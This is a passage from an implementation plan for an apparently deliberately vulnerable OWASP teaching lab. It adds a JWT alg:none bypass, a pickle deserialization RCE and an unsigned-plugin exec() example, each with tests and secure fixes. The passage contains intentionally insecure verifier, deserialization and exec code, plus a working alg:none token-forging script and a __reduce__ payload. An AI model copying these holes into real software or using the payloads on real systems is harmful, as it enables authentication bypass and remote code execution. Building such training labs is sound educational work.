def test_jwt_alg_none_bypass_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"JWT alg:none Signature Bypass" in response.data
    assert b'href="/a08/admin-api"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_jwt_alg_none_bypass.py -v`
Expected: FAIL — 404 (no routes yet).

- [ ] **Step 3: Add the routes**

Modify `app/categories/a08_integrity_failures/routes.py` — after the
preferences route, add:

```python


JWT_SECRET = "a08-jwt-signing-key-2026"


def _b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s):
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def issue_token(payload, alg="HS256"):
    header = {"alg": alg, "typ": "JWT"}
    header_seg = _b64url_encode(json.dumps(header).encode())
    payload_seg = _b64url_encode(json.dumps(payload).encode())
    signing_input = f"{header_seg}.{payload_seg}".encode()
    if alg == "HS256":
        sig = hmac.new(JWT_SECRET.encode(), signing_input, hashlib.sha256).digest()
        sig_seg = _b64url_encode(sig)
    else:
        sig_seg = ""
    return f"{header_seg}.{payload_seg}.{sig_seg}"


def verify_token(token):
    # VULNERABLE: reads the algorithm from the token's OWN header instead
    # of pinning to a fixed expected algorithm -- the classic alg
    # confusion / alg:none bug class.
    header_seg, payload_seg, sig_seg = token.split(".")
    header = json.loads(_b64url_decode(header_seg))
    payload = json.loads(_b64url_decode(payload_seg))
    signing_input = f"{header_seg}.{payload_seg}".encode()
    alg = header.get("alg")
    if alg == "HS256":
        expected_sig = hmac.new(JWT_SECRET.encode(), signing_input, hashlib.sha256).digest()
        actual_sig = _b64url_decode(sig_seg) if sig_seg else b""
        if not hmac.compare_digest(expected_sig, actual_sig):
            raise ValueError("bad signature")
    elif alg == "none":
        pass
    else:
        raise ValueError("unsupported alg")
    return payload


@a08_bp.route("/api-token")
def api_token():
    token = issue_token({"user": "guest", "role": "guest"})
    return render_template("a08_integrity_failures/api_token.html", token=token)


@a08_bp.route("/admin-api", methods=["GET", "POST"])
def admin_api():
    result = None
    error = None
    if request.method == "POST":
        token = request.form.get("token", "")
        try:
            payload = verify_token(token)
            if payload.get("role") == "admin":
                result = f"ADMIN ACCESS GRANTED -- welcome, {payload.get('user')}"
            else:
                error = f"Access denied -- role '{payload.get('role')}' is not admin."
        except Exception as e:
            error = f"Invalid token: {e}"
    return render_template("a08_integrity_failures/admin_api.html", result=result, error=error)
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a08_integrity_failures/__init__.py` — in the
`examples=[...]` list, after the `unchecked-signature-cookie` entry, add:

```python
            ExampleNav(
                id="jwt-alg-none-bypass",
                title="JWT alg:none Signature Bypass",
                group="Broken Signature Verification",
                difficulty="Medium",
                endpoint="a08_integrity_failures.admin_api",
            ),
```

- [ ] **Step 5: Create the templates**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/api_token.html`:

```html
{% extends "core/base.html" %}
{% block title %}Get API Token — A08{% endblock %}

{% block content %}
<h1>Get API Token</h1>
<p>Your token (guest role):</p>
<pre><code class="language-text">{{ token }}</code></pre>
<a href="{{ url_for('a08_integrity_failures.admin_api') }}" class="btn btn-outline-secondary btn-sm">Go to Admin API</a>
{% endblock %}
```

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/admin_api.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "JWT alg:none Signature Bypass" %}
{% set example_difficulty = "Medium" %}
{% set code_language = "javascript" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  This hand-rolled, HS256-signed token format is the same shape as a real
  JWT — a base64url header, payload, and signature joined with dots. The
  verifier's bug: it reads which algorithm to use for verification from
  the <em>token's own header</em>, rather than always expecting HS256. An
  attacker who controls the token controls how it gets checked.
</p>
{% endblock %}

{% block detect %}
<p>
  Get a real guest token from
  <a href="{{ url_for('a08_integrity_failures.api_token') }}">/a08/api-token</a>
  and submit it below — access is correctly denied, since the guest role
  isn't admin. A tampered signature is also correctly rejected. The bug
  only appears once you change which algorithm the token itself claims to
  use.
</p>
{% endblock %}

{% block exploitation %}
<p>
  Build this token yourself — no valid signature required, because the
  header simply says not to check one:
</p>
<pre><code class="language-python">import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "attacker", "role": "admin"}).encode())
print(f"{header}.{payload}.")</code></pre>
<p>
  Submit the printed token below. It returns
  <strong>ADMIN ACCESS GRANTED</strong> — the verifier saw
  <code>"alg": "none"</code> in the header and simply skipped signature
  verification entirely, exactly as the header instructed it to.
</p>
{% endblock %}

{% block vulnerable_code %}var alg = header.alg;  // read from the ATTACKER-CONTROLLED token itself
if (alg === "HS256") {
  // verify signature...
} else if (alg === "none") {
  // no verification at all
}
{% endblock %}

{% block secure_code %}// Never let the token decide how it gets verified -- pin the expected
// algorithm in the verifier itself:
if (header.alg !== "HS256") {
  throw new Error("unsupported alg");
}
// verify signature unconditionally
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Token</label>
    <textarea class="form-control" name="token" rows="3"></textarea>
  </div>
  <button type="submit" class="btn btn-primary">Call Admin API</button>
</form>
{% if result %}
<p class="mt-3 text-success">{{ result }}</p>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_jwt_alg_none_bypass.py -v`
Expected: PASS (5 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a08_integrity_failures tests/test_a08_jwt_alg_none_bypass.py
git commit -m "feat(a08): add JWT alg:none signature bypass example"
```

---

## Task 5: Example 5 (Pickle Deserialization RCE, Hard)

**Files:**
- Modify: `app/categories/a08_integrity_failures/routes.py`
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/cart_rce_demo.html`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/rce_proof.html`
- Test: `tests/test_a08_cart_pickle_rce.py`

**Interfaces:**
- Consumes: `a08_bp`, `write_rce_proof()`, `CART_COOKIE`,
  `serialize_cart()`/`deserialize_cart()`, `RceProof` model from Task 1
  (via the already-existing `/a08/cart` route, unchanged).
- Produces: Route endpoint `a08_integrity_failures.cart_rce_demo` → `GET
  /a08/cart-rce-demo`. Route endpoint `a08_integrity_failures.rce_proof` →
  `GET /a08/rce-proof` (shared non-nav utility page — Task 6 reuses this
  unchanged).

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_cart_pickle_rce.py`:

```python
from app.categories.a08_integrity_failures.models import RceProof


def test_cart_rce_demo_page_renders_and_plants_the_payload_cookie(client):
    response = client.get("/a08/cart-rce-demo")
    assert response.status_code == 200
    assert "a08_cart" in response.headers.get("Set-Cookie", "")


def test_cart_rce_demo_genuinely_executes_code_on_deserialization(app, client):
    with app.app_context():
        before_count = RceProof.query.count()

    # Visiting the demo page plants the malicious cart cookie; visiting
    # /a08/cart next is what actually calls pickle.loads() on it.
    demo_response = client.get("/a08/cart-rce-demo")
    assert demo_response.status_code == 200

    cart_response = client.get("/a08/cart")
    assert cart_response.status_code == 200

    with app.app_context():
        after_count = RceProof.query.count()
        latest = RceProof.query.order_by(RceProof.id.desc()).first()

    assert after_count == before_count + 1
    assert latest.message == "PWNED-VIA-PICKLE-RCE"


def test_rce_proof_page_shows_recorded_proofs(app, client):
    client.get("/a08/cart-rce-demo")
    client.get("/a08/cart")

    response = client.get("/a08/rce-proof")
    assert response.status_code == 200
    assert b"PWNED-VIA-PICKLE-RCE" in response.data


def test_cart_pickle_rce_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Pickle Deserialization RCE" in response.data
    assert b'href="/a08/cart-rce-demo"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_cart_pickle_rce.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the routes**

Modify `app/categories/a08_integrity_failures/routes.py` — after the
`cart` route, add:

```python


class _EvilCartPayload:
    def __reduce__(self):
        # __reduce__ tells pickle "to reconstruct me, call this function
        # with these args" -- pickle calls it during LOADING, which is
        # what makes this genuine remote code execution, not just data
        # tampering.
        return (write_rce_proof, ("PWNED-VIA-PICKLE-RCE",))


@a08_bp.route("/cart-rce-demo")
def cart_rce_demo():
    proofs = RceProof.query.order_by(RceProof.triggered_at.desc()).all()
    malicious_cookie_value = serialize_cart(_EvilCartPayload())
    resp = make_response(
        render_template(
            "a08_integrity_failures/cart_rce_demo.html",
            proofs=proofs,
            malicious_cookie_value=malicious_cookie_value,
        )
    )
    # Plant the malicious payload as this browser's cart cookie -- visiting
    # /a08/cart next is what actually triggers pickle.loads() on it.
    resp.set_cookie(CART_COOKIE, malicious_cookie_value)
    return resp


@a08_bp.route("/rce-proof")
def rce_proof():
    proofs = RceProof.query.order_by(RceProof.triggered_at.desc()).all()
    return render_template("a08_integrity_failures/rce_proof.html", proofs=proofs)
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a08_integrity_failures/__init__.py` — in the
`examples=[...]` list, after the `jwt-alg-none-bypass` entry, add:

```python
            ExampleNav(
                id="cart-pickle-rce",
                title="Pickle Deserialization RCE",
                group="Insecure Deserialization",
                difficulty="Hard",
                endpoint="a08_integrity_failures.cart_rce_demo",
            ),
```

- [ ] **Step 5: Create the templates**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/cart_rce_demo.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Pickle Deserialization RCE" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  The "Pickle Cart Tampering" example proved data tampering — no code
  ran, just a manipulated price. Pickle's real danger goes further: any
  object whose class defines <code>__reduce__</code> can tell pickle to
  call an arbitrary function, with arbitrary arguments, the moment it's
  <em>deserialized</em> — not when it's created, not in the attacker's
  own process, but inside your server, the instant
  <code>pickle.loads()</code> runs.
</p>
{% endblock %}

{% block detect %}
<p>
  Visiting this page plants a specially-crafted cart cookie in your
  browser (shown below). Nothing happens yet — pickling doesn't run the
  payload, only loading does.
</p>
{% endblock %}

{% block exploitation %}
<p>This page just planted the following cookie value for you:</p>
<pre><code class="language-text">{{ malicious_cookie_value }}</code></pre>
<p>
  It was generated from a class whose <code>__reduce__</code> method
  returns <code>(write_rce_proof, ("PWNED-VIA-PICKLE-RCE",))</code> — an
  instruction telling pickle "when you reconstruct me, call
  <code>write_rce_proof("PWNED-VIA-PICKLE-RCE")</code> instead."
</p>
<p>
  Now visit <a href="{{ url_for('a08_integrity_failures.cart') }}">/a08/cart</a>
  — that's the same vulnerable endpoint from the Easy-tier example, and
  it's about to deserialize the cookie you're now carrying.
</p>
<p>Then check the proof:</p>
<a href="{{ url_for('a08_integrity_failures.rce_proof') }}" class="btn btn-outline-secondary btn-sm">
  Check RCE Proof
</a>
<p class="mt-3">
  Current recorded proofs ({{ proofs|length }}):
</p>
<ul>
  {% for proof in proofs %}
  <li>{{ proof.triggered_at }} — {{ proof.message }}</li>
  {% endfor %}
</ul>
{% endblock %}

{% block vulnerable_code %}class _EvilCartPayload:
    def __reduce__(self):
        return (write_rce_proof, ("PWNED-VIA-PICKLE-RCE",))

# any callable + args works here -- write_rce_proof is used in this lab
# to keep the proof safe and contained, but pickle.loads() will call
# ANY function a crafted __reduce__ points it at, with full application
# privileges
{% endblock %}

{% block secure_code %}# Never deserialize untrusted data with pickle -- use JSON (which has no
# mechanism for arbitrary code execution at all) and verify a signature
# before trusting it, exactly as shown in the Easy-tier example's fix.
{% endblock %}

{% block live_example %}
<a href="{{ url_for('a08_integrity_failures.cart') }}" class="btn btn-primary">
  Trigger It: Go to Cart
</a>
{% endblock %}
```

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/rce_proof.html`:

```html
{% extends "core/base.html" %}
{% block title %}RCE Proof — A08{% endblock %}

{% block content %}
<h1>RCE Proof Log</h1>
<p>Every row here was written by code that ran during deserialization or plugin installation, not by this page itself.</p>
{% if proofs %}
<table class="table table-sm">
  <thead><tr><th>Time</th><th>Message</th></tr></thead>
  <tbody>
    {% for proof in proofs %}
    <tr><td>{{ proof.triggered_at }}</td><td>{{ proof.message }}</td></tr>
    {% endfor %}
  </tbody>
</table>
{% else %}
<p>No proofs recorded yet.</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_cart_pickle_rce.py -v`
Expected: PASS (4 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a08_integrity_failures tests/test_a08_cart_pickle_rce.py
git commit -m "feat(a08): add pickle-deserialization-RCE example"
```

---

## Task 6: Example 6 (Unsigned Plugin Installation Leads to RCE, Hard)

**Files:**
- Modify: `app/categories/a08_integrity_failures/routes.py`
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/plugin_marketplace_rce_demo.html`
- Test: `tests/test_a08_plugin_marketplace_rce.py`

**Interfaces:**
- Consumes: `a08_bp`, `write_rce_proof()`, `RceProof` model,
  `OFFICIAL_PLUGIN_SOURCE`/`MALICIOUS_PLUGIN_SOURCE`,
  `official_plugin_download`/`malicious_plugin_demo_download` from Tasks 1
  and 2 (via the already-existing `/a08/plugin-marketplace` route,
  unchanged). Reuses the `rce_proof()` route/template from Task 5
  unchanged.
- Produces: Route endpoint
  `a08_integrity_failures.plugin_marketplace_rce_demo` → `GET
  /a08/plugin-marketplace-rce-demo`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_plugin_marketplace_rce.py`:

```python
from app.categories.a08_integrity_failures.models import RceProof


def test_plugin_marketplace_rce_demo_page_renders(client):
    response = client.get("/a08/plugin-marketplace-rce-demo")
    assert response.status_code == 200
    assert b"malicious-plugin-demo.py" in response.data


def test_installing_the_malicious_plugin_genuinely_executes_code(app, client):
    with app.app_context():
        before_count = RceProof.query.count()

    malicious_source = client.get("/a08/plugin-marketplace/malicious-plugin-demo.py").data.decode()
    assert "write_rce_proof" in malicious_source

    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class _Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(malicious_source.encode())

        def log_message(self, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), _Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        response = client.post(
            "/a08/plugin-marketplace",
            data={"plugin_url": f"http://127.0.0.1:{port}/malicious-plugin-demo.py"},
        )
        assert response.status_code == 200
    finally:
        server.shutdown()
        thread.join(timeout=5)

    with app.app_context():
        after_count = RceProof.query.count()
        latest = RceProof.query.order_by(RceProof.id.desc()).first()

    assert after_count == before_count + 1
    assert latest.message == "PWNED-VIA-UNSIGNED-PLUGIN-INSTALL"


def test_plugin_marketplace_rce_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Unsigned Plugin Installation Leads to RCE" in response.data
    assert b'href="/a08/plugin-marketplace-rce-demo"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_plugin_marketplace_rce.py -v`
Expected: `test_plugin_marketplace_rce_demo_page_renders` and the overview-
link test FAIL with 404 (no route yet).
`test_installing_the_malicious_plugin_genuinely_executes_code` already
PASSes — the underlying `plugin_marketplace()`/`write_rce_proof()`
mechanics from Tasks 1-2 already make the exploit itself work; this task
only adds the dedicated teaching page. That's expected and fine, matching
the same pattern already established in A06's Task 5 and A07's Task 5.

- [ ] **Step 3: Add the route**

Modify `app/categories/a08_integrity_failures/routes.py` — after the
`rce_proof` route, add:

```python


@a08_bp.route("/plugin-marketplace-rce-demo")
def plugin_marketplace_rce_demo():
    proofs = RceProof.query.order_by(RceProof.triggered_at.desc()).all()
    return render_template(
        "a08_integrity_failures/plugin_marketplace_rce_demo.html", proofs=proofs
    )
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a08_integrity_failures/__init__.py` — in the
`examples=[...]` list, after the `cart-pickle-rce` entry, add:

```python
            ExampleNav(
                id="plugin-marketplace-rce",
                title="Unsigned Plugin Installation Leads to RCE",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Hard",
                endpoint="a08_integrity_failures.plugin_marketplace_rce_demo",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/plugin_marketplace_rce_demo.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Unsigned Plugin Installation Leads to RCE" %}
{% set example_difficulty = "Hard" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  The "Unsigned Plugin Content Trust" example proved content
  substitution — a different, unverified source got installed just as
  readily as the official one. Here's the consequence spelled out: this
  marketplace doesn't just <em>display</em> whatever it fetches, it
  <code>exec()</code>s it as part of installation. Fetching content from
  an untrusted source doesn't just risk showing the wrong text — it means
  running that source's code with full application privileges.
</p>
{% endblock %}

{% block detect %}
<p>
  Same detection as the Medium-tier example — the vulnerability is
  identical. What changes here is the consequence: instead of just
  proving the marketplace accepted different content, this proves that
  content ran.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Download the
      <a href="{{ url_for('a08_integrity_failures.malicious_plugin_demo_download') }}">substituted plugin demo</a>
      and host it locally:
      <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
  </li>
  <li>Install it from
      <a href="{{ url_for('a08_integrity_failures.plugin_marketplace') }}">/a08/plugin-marketplace</a>
      using <code>http://127.0.0.1:8000/malicious-plugin-demo.py</code>.</li>
</ol>
<p>
  The installed content contains a line calling
  <code>write_rce_proof("PWNED-VIA-UNSIGNED-PLUGIN-INSTALL")</code> — and
  because "installing" a plugin means executing its source, that call
  genuinely runs, recording a proof row the instant the plugin is
  installed.
</p>
<p>Then check the proof:</p>
<a href="{{ url_for('a08_integrity_failures.rce_proof') }}" class="btn btn-outline-secondary btn-sm">
  Check RCE Proof
</a>
<p class="mt-3">
  Current recorded proofs ({{ proofs|length }}):
</p>
<ul>
  {% for proof in proofs %}
  <li>{{ proof.triggered_at }} — {{ proof.message }}</li>
  {% endfor %}
</ul>
{% endblock %}

{% block vulnerable_code %}with urllib.request.urlopen(plugin_url, timeout=5) as resp:
    source = resp.read().decode("utf-8", errors="replace")
exec(source, {"__builtins__": __builtins__, "write_rce_proof": write_rce_proof})
# any URL's content is executed with no verification at all
{% endblock %}

{% block secure_code %}# Same fix as the Medium-tier example -- verify a checksum against a
# trusted-source registry before ever calling exec() on fetched content.
{% endblock %}

{% block live_example %}
<a href="{{ url_for('a08_integrity_failures.plugin_marketplace') }}" class="btn btn-primary">
  Go to Plugin Marketplace
</a>
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_plugin_marketplace_rce.py -v`
Expected: PASS (3 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a08_integrity_failures tests/test_a08_plugin_marketplace_rce.py
git commit -m "feat(a08): add unsigned-plugin-installation-RCE example"
```

---

## Task 7: Final Integration — README and Overview Tests

**Files:**
- Modify: `README.md`
- Test: `tests/test_a08_overview.py`

**Interfaces:**
- Consumes: All six examples and the `CategoryNav` from Tasks 1–6.

- [ ] **Step 1: Write the overview/nav tests**

Create `tests/test_a08_overview.py`:

```python
def test_a08_overview_renders(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Software and Data Integrity Failures" in response.data
    assert b"mermaid" in response.data
    assert b"language-python" in response.data


def test_a08_registered_in_nav(app):
    from app.core.nav import CATEGORIES

    a08 = next(c for c in CATEGORIES if c.id == "a08_integrity_failures")
    assert a08.short_id == "A08"
    assert [e.difficulty for e in a08.examples] == [
        "Easy",
        "Medium",
        "Easy",
        "Medium",
        "Hard",
        "Hard",
    ]


def test_a08_examples_grouped_by_vulnerability_subtype(app):
    from app.core.nav import CATEGORIES

    a08 = next(c for c in CATEGORIES if c.id == "a08_integrity_failures")
    grouped = a08.grouped_examples()
    assert [name for name, _ in grouped] == [
        "Insecure Deserialization",
        "Unsigned Software Updates & Supply Chain",
        "Broken Signature Verification",
    ]
    assert [e.id for e in grouped[0][1]] == ["cart-pickle-tampering", "cart-pickle-rce"]
    assert [e.id for e in grouped[1][1]] == [
        "plugin-marketplace-tampering",
        "plugin-marketplace-rce",
    ]
    assert [e.id for e in grouped[2][1]] == [
        "unchecked-signature-cookie",
        "jwt-alg-none-bypass",
    ]
    difficulty_rank = {"Easy": 0, "Medium": 1, "Hard": 2}
    for _, examples in grouped:
        ranks = [difficulty_rank[e.difficulty] for e in examples]
        assert ranks == sorted(ranks), "group examples must be Easy-to-Hard"


def test_a08_overview_shows_vulnerability_subtype_group_headings(client):
    response = client.get("/a08/")
    body = response.data.decode()
    assert "Insecure Deserialization" in body
    assert "Unsigned Software Updates &amp; Supply Chain" in body
    assert "Broken Signature Verification" in body
```

Note: the group name "Unsigned Software Updates & Supply Chain" contains a
literal `&`, which Jinja2's default autoescaping renders as `&amp;` in
HTML output — assert against the escaped form, matching the exact pattern
A05's and A07's group-heading tests established for the same reason.

- [ ] **Step 2: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_overview.py -v`
Expected: PASS (4 passed)

- [ ] **Step 3: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all tests pass. Baseline before this plan was 334 (post-A07).
This plan's new tests: 4 (Task 1) + 5 (Task 2) + 4 (Task 3) + 5 (Task 4) +
4 (Task 5) + 3 (Task 6) + 4 (Task 7) = 29 new tests → 363 total.

- [ ] **Step 4: Update README.md's intro paragraph**

Modify `README.md` — read the current file fresh before editing (its
exact wrapping/wording may have drifted slightly since this plan was
written), then extend the "Currently implemented" paragraph's list to
include A08 after A07, changing the trailing "Remaining categories
(A08–A10)" reference to "(A09–A10)". The A08 clause to insert:

```markdown
, and **A08 Software and Data Integrity Failures** (pickle cart tampering,
pickle deserialization RCE, unsigned plugin content trust, unsigned plugin
installation leading to RCE, unchecked signature on a preferences cookie,
JWT alg:none signature bypass)
```

Insert it as the new final item in the list (after A07's clause, before
the "Remaining categories" sentence), matching the exact conjunction
pattern already used for every prior category in that paragraph (a single
"and" before the final item only — double-check this when editing, since
a prior sub-project's final review caught exactly this class of mistake
once already).

- [ ] **Step 5: Update README.md's category summary table**

Modify `README.md` — replace the line:

```
| A08–A10 | Planned | See `docs/superpowers/specs/2026-09-18-owasp-lab-design.md` |
```

with:

```
| A08 Software and Data Integrity Failures | Implemented | Pickle Cart Tampering (Easy), Unsigned Plugin Content Trust (Medium), Unchecked Signature on Preferences Cookie (Easy), JWT alg:none Signature Bypass (Medium), Pickle Deserialization RCE (Hard), Unsigned Plugin Installation Leads to RCE (Hard) |
| A09–A10 | Planned | See `docs/superpowers/specs/2026-09-18-owasp-lab-design.md` |
```

- [ ] **Step 6: Commit**

```bash
git add README.md tests/test_a08_overview.py
git commit -m "docs(a08): update README and add overview/nav tests for A08"
```

No live browser verification step is needed for this category — every
A08 example is fully exercisable and provable through the real Flask test
client (including the two local-`HTTPServer`-backed plugin-marketplace
tests, matching the established pattern from A03's `test_xxe_ssrf_resolver_
genuinely_fetches_http_entities`), which is exactly what every test in
this plan already does. The four novel mechanics (pickle tampering, pickle
RCE, JWT alg:none bypass, unsigned-content exec) were live-verified in a
scratch venv during brainstorming before this plan was written; the plan's
own tests re-prove the same mechanics against the real integrated app.
